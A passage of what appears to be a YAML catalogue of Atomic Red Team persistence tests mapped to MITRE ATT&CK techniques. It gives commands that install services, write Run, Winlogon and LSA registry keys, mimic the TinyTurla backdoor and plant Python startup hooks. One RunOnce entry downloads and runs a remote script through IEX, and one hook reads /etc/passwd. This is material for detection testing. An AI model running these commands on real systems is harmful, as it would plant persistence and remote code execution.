        sc.exe create AtomicTestService_CMD binPath= "PathToAtomicsFolder\T1543.003\bin\AtomicService.exe" start=auto  type=Own
        sc.exe start AtomicTestService_CMD
      cleanup: |-
        sc.exe stop AtomicTestService_CMD >nul 2>&1
        sc.exe delete AtomicTestService_CMD >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Service Installation PowerShell
      type: powershell
      platform: windows
      command: |-
        New-Service -Name "AtomicTestService_PowerShell" -BinaryPathName "PathToAtomicsFolder\T1543.003\bin\AtomicService.exe"
        Start-Service -Name "AtomicTestService_PowerShell"
      cleanup: |-
        Stop-Service -Name "AtomicTestService_PowerShell" 2>&1 | Out-Null
        try {(Get-WmiObject Win32_Service -filter "name='AtomicTestService_PowerShell'").Delete()}
        catch {}
      timeout: 120
      elevation_required: true
    - name: TinyTurla backdoor service w64time
      type: cmd
      platform: windows
      command: |-
        copy "$PathToAtomicsFolder\T1543.003\bin\w64time.dll" %systemroot%\system32\
        sc create W64Time binPath= "c:\Windows\System32\svchost.exe -k TimeService" type= share start=auto
        sc config W64Time DisplayName= "Windows 64 Time"
        sc description W64Time "Maintain date and time synch on all clients and services in the network"
        reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /t REG_MULTI_SZ /d "W64Time" /f
        reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%systemroot%\system32\w64time.dll" /f
        sc start W64Time
      cleanup: |-
        sc stop W64Time
        sc.exe delete W64Time
        del %systemroot%\system32\w64time.dll
        reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /f
        reg delete "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v ServiceDll /f
      timeout: 120
      elevation_required: true
    - name: Remote Service Installation CMD
      type: cmd
      platform: windows
      command: |-
        sc.exe \\localhost create AtomicTestService_CMD binPath= "PathToAtomicsFolder\T1543.003\bin\AtomicService.exe" start=auto type=Own
        sc.exe \\localhost start AtomicTestService_CMD
      cleanup: |-
        sc.exe \\localhost stop AtomicTestService_CMD >nul 2>&1
        sc.exe \\localhost delete AtomicTestService_CMD >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Modify Service to Run Arbitrary Binary (Powershell)
      type: powershell
      platform: windows
      command: |-
        Stop-Service -Name "fax" -force -erroraction silentlycontinue | Out-Null
        set-servicebinarypath -name "fax" -path "$env:windir\system32\notepad.exe"
        start-service -Name "fax" -erroraction silentlycontinue | out-null
      cleanup: |-
        Stop-Service -Name "fax" -force -erroraction silentlycontinue | Out-Null
        set-servicebinarypath -name "fax" -path "$env:windir\system32\fxssvc.exe" -erroraction silentlycontinue | out-null
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1543/003
  is_safe: false
- id: T1543.004
  name: Launch Daemon
  description: Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-le...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - macos
  executors:
    - name: Launch Daemon
      type: bash
      platform: macos
      command: |-
        sudo cp $PathToAtomicsFolder/T1543.004/src/atomicredteam_T1543_004.plist /Library/LaunchDaemons/com.atomicredteam.plist
        sudo launchctl load -w /Library/LaunchDaemons/com.atomicredteam.plist
      cleanup: |-
        sudo launchctl unload /Library/LaunchDaemons/com.atomicredteam.plist
        sudo rm /Library/LaunchDaemons/com.atomicredteam.plist
        sudo rm /tmp/T1543_004_atomicredteam.txt
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1543/004
  is_safe: false
- id: T1546.018
  name: Python Startup Hooks
  description: |-
    Adversaries may achieve persistence by leveraging Python’s startup mechanisms, including path configuration (`.pth`) files and the `sitecustomize.py` or `usercustomize.py` modules. These files are automatically processed during the initialization of the Python interpreter, allowing for the execution of arbitrary code whenever Python is invoked.(Citation: Volexity GlobalProtect CVE 2024)

    Path configuration files are designed to extend Python’s module search paths through the use of import st...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Python Startup Hook - atomic_hook.pth (Windows)
      type: powershell
      platform: windows
      command: |-
        $TempDir = Join-Path $env:TEMP "atomic_pth_win"
        New-Item -ItemType Directory -Path $TempDir -Force
        & "python.exe" -m venv "$TempDir\env"
        $SitePackages = & "$TempDir\env\Scripts\python.exe" -c "import site; print(site.getsitepackages()[1])"
        "import os, subprocess; os.environ.get('CALC_SPAWNED') or (os.environ.update({'CALC_SPAWNED':'1'}) or subprocess.Popen(['calc.exe']))" | Out-File -Encoding ASCII "$SitePackages\atomic_hook.pth"
        Get-ChildItem -Path "$SitePackages" | Where-Object { $_.Name -like "*.pth" }
        & "$TempDir\env\Scripts\python.exe" -c "print('Triggering Hook via atomic_hook...')"
      cleanup: |-
        if (-not (Get-ChildItem -Path $env:TEMP -ErrorAction SilentlyContinue | Where-Object Name -like 'atomic_pth_win')) { Write-Host "[!] Artifact missing: $env:Temp\atomic_pth_win Folder - [-] Please Run : Invoke-AtomicTest T1546.018"; exit 1 };
        Remove-Item -Path "$env:TEMP\atomic_pth_win" -Recurse -Force
        Write-Host "[+] Successfully Removed atomic_pth_win folder and atomic_hook.pth from Temp Directory"
        Get-Process -Name "Calc*" -ErrorAction SilentlyContinue | Stop-Process -Force
        Get-Process -Name "calc*" -ErrorAction SilentlyContinue | Stop-Process -Force
        Write-Host "[+] Successfully Terminated Calculator"
      timeout: 120
    - name: Python Startup Hook - usercustomize.py (Windows)
      type: powershell
      platform: windows
      command: |-
        $UserDir = & "python.exe" -c "import site; print(site.getusersitepackages())"
        if (!(Test-Path $UserDir)) { New-Item -ItemType Directory -Path $UserDir -Force }
        "import os; os.system('calc.exe')" | Out-File -FilePath "$UserDir\usercustomize.py" -Encoding ASCII
        Get-ChildItem -Path "$UserDir"
        & "python.exe" -c "print('Triggering Hook via usercustomize...')"
      cleanup: "$PyBin = if (Get-Command \"python.exe\" -ErrorAction SilentlyContinue) { \"python.exe\" } elseif (Get-Command \"python3.exe\" -ErrorAction SilentlyContinue) { \"python3.exe\" } else { \"python.exe\" }; \n$UserDir = & $PyBin -S -c \"import site; print(site.getusersitepackages())\"\nif (-not (Get-ChildItem -Path $UserDir -Recurse -ErrorAction SilentlyContinue | Where-Object Name -like 'usercustomize*')) { Write-Host \"[!] Artifact missing: $UserDir\\usercustomize.py - [-] Please Run : Invoke-AtomicTest T1546.018\"; exit 1 };\nGet-ChildItem -Path \"$UserDir\" -Recurse -Force |\nWhere-Object { $_.Name -like \"usercustomize*\" } |\nRemove-Item -Force \nWrite-Host \"[+] Successfully Removed usercustomize.py under $UserDir\"\nGet-Process -Name \"Calc*\", \"calc*\" -ErrorAction SilentlyContinue | Stop-Process -Force\nWrite-Host \"[+] Successfully Terminated Calculator\""
      timeout: 120
    - name: Python Startup Hook - atomic_hook.pth (Linux)
      type: sh
      platform: linux
      command: |-
        TEMPDIR="/tmp/atomic_sitecust_posix"
        mkdir -p "$TEMPDIR"
        "python3" -m venv "$TEMPDIR/env"
        SITE_PACKAGES=$("$TEMPDIR/env/bin/python3" -c "import site; print(site.getsitepackages()[0])")
        echo "import os; os.system('cat /etc/passwd 1> /tmp/atomic_hook_poc.txt')" > "$SITE_PACKAGES/atomic_hook.pth"
        ls -la "$SITE_PACKAGES/atomic_hook.pth"
        "$TEMPDIR/env/bin/python" -c "print('Triggering Hook via atomic_hook...')"
        if [ -f /tmp/atomic_hook_poc.txt ]; then echo "[+] Success: atomic_hook_poc.txt created under /tmp \n" $(ls -la /tmp/ | grep -w atomic_hook_poc.txt); else echo "Failed: /tmp/atomic_hook_poc.txt not found"; fi
      cleanup: |-
        if [ ! -f /tmp/atomic_hook_poc.txt ] || [ ! -d /tmp/atomic_sitecust_posix ]; then echo "[!] Missing artifact or folder: /tmp/atomic_hook_poc.txt or /tmp/atomic_sitecust_posix — [-] Please Run : Invoke-AtomicTest T1546.018"; exit 0; fi
        rm -rf /tmp/atomic_sitecust_posix
        echo "[+] Successful Removed atomic_hook.pth"
        rm -rf /tmp/atomic_hook_poc.txt
        echo "[+] Successful Removed atomic_hook_poc.txt under /tmp"
      timeout: 60
    - name: Python Startup Hook - atomic_hook.pth (macOS)
      type: sh
      platform: macos
      command: |-
        PYTHON_EXE=$(command -v python3 || command -v python)
        TEMPDIR=$(mktemp -d /tmp/atomic_python_hook_XX)
        echo "$TEMPDIR" > /tmp/atomic_python_hook_path.txt
        $PYTHON_EXE -m venv "$TEMPDIR/env"
        SITE_PACKAGES=$("$TEMPDIR/env/bin/python3" -c "import site; print(site.getsitepackages()[0])")
        echo "import subprocess; subprocess.Popen(['open', '-a', 'Calculator'])" > "$SITE_PACKAGES/atomic_hook.pth"
        "$TEMPDIR/env/bin/python" -c "print('Triggering Hook via atomic_hook...')"
      cleanup: |-
        if [ ! -f /tmp/atomic_python_hook_path.txt ] || [ ! -d $(cat /tmp/atomic_python_hook_path.txt) ]; then echo "[!] Artifact missing: /tmp/atomic_python_hook_path.txt — [-] Please Run : Invoke-AtomicTest T1546.018"; exit 0; fi
        pkill "Calculator" || true
        [ -f /tmp/atomic_python_hook_path.txt ] && rm -rf $(cat /tmp/atomic_python_hook_path.txt) && rm -f /tmp/atomic_python_hook_path.txt
        echo "[+] Successful Removed atomic_hook.pth and terminated Calculator"
      timeout: 60
    - name: Python Startup Hook - usercustomize.py (Linux / MacOS)
      type: sh
      platform: linux
      command: |-
        PYTHON_EXE=$(command -v python3 || command -v python)
        USER_PACKAGES=$($PYTHON_EXE -c "import site; print(site.getusersitepackages())")
        mkdir -p "$USER_PACKAGES"
        echo "import os; os.system('date > /tmp/poc.txt')" > "$USER_PACKAGES/usercustomize.py"
        if [ -f "$USER_PACKAGES/usercustomize.py" ]; then echo "Success: usercustomize.py created under $USER_PACKAGES\n" $(ls -la "$USER_PACKAGES" | grep usercustomize*); else echo "Failed: usercustomize.py not found under $USER_PACKAGES"; fi
        $PYTHON_EXE -c "print('Triggering Hook via usercustomize.py...')"
        if [ -f /tmp/poc.txt ]; then echo "Success: poc.txt created under /tmp\n" $(ls -la /tmp/ | grep -w poc.txt); else echo "Failed: /tmp/poc.txt not found"; fi
      cleanup: |-
        PYTHON_CMD=$(command -v python3 || command -v python)
        USER_PACKAGES=$($PYTHON_CMD -S -c "import site; print(site.getusersitepackages())")
        if [ ! -f /tmp/poc.txt ] || [ ! -f $USER_PACKAGES/usercustomize.py ]; then echo "[!] Artifact missing: /tmp/poc.txt and $USER_PACKAGES/usercustomize.py — [-] Please Run : Invoke-AtomicTest T1546.018"; exit 0; fi
        if [ -e "$USER_PACKAGES"/usercustomize* ]; then echo "[+] Successful remove $USER_PACKAGES/usercustomize.py\n" $(rm -rf "$USER_PACKAGES"/usercustomize*); else echo "usercustomize.py not found under $USER_PACKAGES"; fi
        rm -rf /tmp/poc.txt
        echo "[+] Successful remove poc.txt under /tmp"
      timeout: 60
    - name: Python Startup Hook - usercustomize.py (Linux / MacOS)
      type: sh
      platform: macos
      command: |-
        PYTHON_EXE=$(command -v python3 || command -v python)
        USER_PACKAGES=$($PYTHON_EXE -c "import site; print(site.getusersitepackages())")
        mkdir -p "$USER_PACKAGES"
        echo "import os; os.system('date > /tmp/poc.txt')" > "$USER_PACKAGES/usercustomize.py"
        if [ -f "$USER_PACKAGES/usercustomize.py" ]; then echo "Success: usercustomize.py created under $USER_PACKAGES\n" $(ls -la "$USER_PACKAGES" | grep usercustomize*); else echo "Failed: usercustomize.py not found under $USER_PACKAGES"; fi
        $PYTHON_EXE -c "print('Triggering Hook via usercustomize.py...')"
        if [ -f /tmp/poc.txt ]; then echo "Success: poc.txt created under /tmp\n" $(ls -la /tmp/ | grep -w poc.txt); else echo "Failed: /tmp/poc.txt not found"; fi
      cleanup: |-
        PYTHON_CMD=$(command -v python3 || command -v python)
        USER_PACKAGES=$($PYTHON_CMD -S -c "import site; print(site.getusersitepackages())")
        if [ ! -f /tmp/poc.txt ] || [ ! -f $USER_PACKAGES/usercustomize.py ]; then echo "[!] Artifact missing: /tmp/poc.txt and $USER_PACKAGES/usercustomize.py — [-] Please Run : Invoke-AtomicTest T1546.018"; exit 0; fi
        if [ -e "$USER_PACKAGES"/usercustomize* ]; then echo "[+] Successful remove $USER_PACKAGES/usercustomize.py\n" $(rm -rf "$USER_PACKAGES"/usercustomize*); else echo "usercustomize.py not found under $USER_PACKAGES"; fi
        rm -rf /tmp/poc.txt
        echo "[+] Successful remove poc.txt under /tmp"
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1546/018
  is_safe: false
- id: T1547
  name: Boot or Logon Autostart Execution
  description: 'Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming) These mechanisms may inc...'
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Add a driver
      type: cmd
      platform: windows
      command: pnputil.exe /add-driver "C:\Windows\INF\usbstor.inf"
      timeout: 120
    - name: Driver Installation Using pnputil.exe
      type: powershell
      platform: windows
      command: pnputil.exe -i -a C:\Windows\INF\acpipmi.inf
      timeout: 120
    - name: Leverage Virtual Channels to execute custom DLL during successful RDP session
      type: cmd
      platform: windows
      command: reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default\Addins\Malware" /v Name /t REG_SZ /d "C:\Windows\System32\amsi.dll" /f
      cleanup: reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default\Addins\Malware" /f
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1547
  is_safe: false
- id: T1547.001
  name: Registry Run Keys / Startup Folder
  description: |-
    Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.

    The following run keys are created by default on Windows systems:

    * <code>HKEY_CURRENT_USER\...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Reg Key Run
      type: cmd
      platform: windows
      command: REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "C:\Path\AtomicRedTeam.exe"
      cleanup: REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /f >nul 2>&1
      timeout: 120
    - name: Reg Key RunOnce
      type: cmd
      platform: windows
      command: REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Path\AtomicRedTeam.dll"
      cleanup: REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: PowerShell Registry RunOnce
      type: powershell
      platform: windows
      command: |-
        $RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
        set-itemproperty $RunOnceKey "NextRun" 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(`"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`")"'
      cleanup: Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name "NextRun" -Force -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Suspicious vbs file run from startup Folder
      type: powershell
      platform: windows
      command: |-
        Copy-Item "$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
        Copy-Item "$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
        cscript.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
        cscript.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
      cleanup: |-
        Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs" -ErrorAction Ignore
        Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs" -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Suspicious jse file run from startup Folder
      type: powershell
      platform: windows
      command: |-
        Copy-Item "$PathToAtomicsFolder\T1547.001\src\jsestartup.jse" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
        Copy-Item "$PathToAtomicsFolder\T1547.001\src\jsestartup.jse" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
        cscript.exe /E:Jscript "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
        cscript.exe /E:Jscript "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
      cleanup: |-
        Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse" -ErrorAction Ignore
        Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse" -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Suspicious bat file run from startup Folder
      type: powershell
      platform: windows
      command: |-
        Copy-Item "$PathToAtomicsFolder\T1547.001\src\batstartup.bat" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
        Copy-Item "$PathToAtomicsFolder\T1547.001\src\batstartup.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
        Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
        Start-Process "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
      cleanup: |-
        Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat" -ErrorAction Ignore
        Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat" -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Add Executable Shortcut Link to User Startup Folder
      type: powershell
      platform: windows
      command: |-
        $Target = "C:\Windows\System32\calc.exe"
        $ShortcutLocation = "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk"
        $WScriptShell = New-Object -ComObject WScript.Shell
        $Create = $WScriptShell.CreateShortcut($ShortcutLocation)
        $Create.TargetPath = $Target
        $Create.Save()
      cleanup: Remove-Item "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk" -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Add persistance via Recycle bin
      type: cmd
      platform: windows
      command: reg ADD "HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command" /ve /d "calc.exe" /f
      cleanup: reg DELETE "HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open" /f
      timeout: 120
    - name: SystemBC Malware-as-a-Service Registry
      type: powershell
      platform: windows
      command: |-
        $RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $RunKey -Name "socks5_powershell" -Value "powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File"
      cleanup: Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name "socks5_powershell" -Force -ErrorAction Ignore
      timeout: 120
    - name: Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value
      type: powershell
      platform: windows
      command: |-
        New-Item -ItemType Directory -path "$env:TMP\atomictest\"
        Copy-Item -path "C:\Windows\System32\calc.exe" -destination "$env:TMP\atomictest\"
        Set-ItemProperty -Path  "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Common Startup" -Value "$env:TMP\atomictest\"
      cleanup: |-
        Set-ItemProperty -Path  "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Common Startup" -Value "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup"
        Remove-Item "$env:TMP\atomictest\" -Recurse -Force
      timeout: 120
      elevation_required: true
    - name: Change Startup Folder - HKCU Modify User Shell Folders Startup Value
      type: powershell
      platform: windows
      command: |-
        New-Item -ItemType Directory -path "$env:TMP\atomictest\"
        Copy-Item -path "C:\Windows\System32\calc.exe" -destination "$env:TMP\atomictest\"
        Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "$env:TMP\atomictest\"
      cleanup: |-
        Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
        Remove-Item "$env:TMP\atomictest\" -Recurse -Force
      timeout: 120
    - name: HKCU - Policy Settings Explorer Run Key
      type: powershell
      platform: windows
      command: |-
        if (!(Test-Path -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")){
          New-Item -ItemType Key -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        }
        if (!(Test-Path -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run")){
          New-Item -ItemType Key -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
        }
        Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "atomictest" -Value "C:\Windows\System32\calc.exe"
      cleanup: Remove-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "atomictest"
      timeout: 120
      elevation_required: true
    - name: HKLM - Policy Settings Explorer Run Key
      type: powershell
      platform: windows
      command: |-
        if (!(Test-Path -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run")){
          New-Item -ItemType Key -Path  "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
        }
        Set-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "atomictest" -Value "C:\Windows\System32\calc.exe"
      cleanup: Remove-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "atomictest"
      timeout: 120
      elevation_required: true
    - name: HKLM - Append Command to Winlogon Userinit KEY Value
      type: powershell
      platform: windows
      command: |-
        $oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit");
        Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit-backup" -Value "$oldvalue";
        $newvalue = $oldvalue + " C:\Windows\System32\calc.exe";
        Set-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "$newvalue"
      cleanup: |-
        $oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name 'Userinit-backup');
        Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "$oldvalue";
        Remove-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name 'Userinit-backup'
      timeout: 120
      elevation_required: true
    - name: 'HKLM - Modify default System Shell - Winlogon Shell KEY Value '
      type: powershell
      platform: windows
      command: |-
        $oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell");
        Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell-backup" -Value "$oldvalue";
        $newvalue = $oldvalue + ", C:\Windows\explorer.exe";
        Set-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "$newvalue"
      cleanup: |-
        $oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name 'Shell-backup');
        Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "$oldvalue";
        Remove-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name 'Shell-backup'
      timeout: 120
      elevation_required: true
    - name: secedit used to create a Run key in the HKLM Hive
      type: cmd
      platform: windows
      command: |-
        secedit /import /db mytemplate.db /cfg "$PathToAtomicsFolder\T1547.001\src\regtemplate.ini"
        secedit /configure /db mytemplate.db
      cleanup: REG DELETE "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "calc" /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Modify BootExecute Value
      type: powershell
      platform: windows
      command: |-
        if (!(Test-Path "$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg")) { reg.exe export "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" "$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg" /y }
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "BootExecute" -Value "autocheck autoche *" -Type MultiString
      cleanup: |-
        reg.exe import "$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg"
        Remove-Item -Path "$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg" -Force
      timeout: 120
      elevation_required: true
    - name: Allowing custom application to execute during new RDP logon session
      type: cmd
      platform: windows
      command: reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd" /f /v StartupPrograms /t REG_SZ /d "calc"
      cleanup: reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd" /f /v StartupPrograms /t REG_SZ /d "rdpclip"
      timeout: 120
      elevation_required: true
    - name: Creating Boot Verification Program Key for application execution during successful boot
      type: cmd
      platform: windows
      command: reg add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d "C:\Program Files\Internet Explorer\iexplore.exe"
      cleanup: reg delete HKLM\System\CurrentControlSet\Control\BootVerificationProgram /f
      timeout: 120
      elevation_required: true
    - name: Add persistence via Windows Context Menu
      type: cmd
      platform: windows
      command: reg add "HKEY_CLASSES_ROOT\Directory\Background\shell\Size Modify\command" /ve /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
      cleanup: reg delete "HKEY_CLASSES_ROOT\Directory\Background\shell\Size Modify" /f
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1547/001
  is_safe: false
- id: T1547.002
  name: Authentication Package
  description: |-
    Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.(Citation: MSDN Authentication Packages)

    Adversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registr...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Authentication Package
      type: powershell
      platform: windows
      command: |-
        Copy-Item "$PathToAtomicsFolder\T1547.002\bin\package.dll" C:\Windows\System32\
        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0\0package.dll" /f
      cleanup: |-
        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0" /f
        rm -force C:\windows\system32\package.dll
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1547/002
  is_safe: false
- id: T1547.003
  name: Time Providers
  description: |-
    Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.(Citation: Microsoft TimeProvider)

    Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of `HKEY_...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Create a new time provider
      type: powershell
      platform: windows
      command: |-
        net stop w32time
        Copy-Item "$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll" C:\Users\Public\AtomicTest.dll
        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest" /t REG_SZ /v "DllName" /d "C:\Users\Public\AtomicTest.dll" /f
        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest" /t REG_DWORD /v "Enabled" /d "1" /f
        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest" /t REG_DWORD /v "InputProvider" /d "1" /f
